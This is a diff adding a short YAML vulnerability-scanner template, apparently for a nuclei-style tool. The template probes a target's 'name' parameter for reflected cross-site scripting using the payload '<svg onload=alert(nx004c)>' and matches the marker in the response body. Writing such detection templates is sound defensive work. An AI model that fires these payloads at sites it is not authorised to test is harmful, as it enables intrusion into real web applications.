@@ -1,0 +1,20 @@
+id: xss-005
+name: 'Reflected XSS ctx-4 via name'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in name'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      name:
+        - '<svg onload=alert(nx004c)>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx004c'
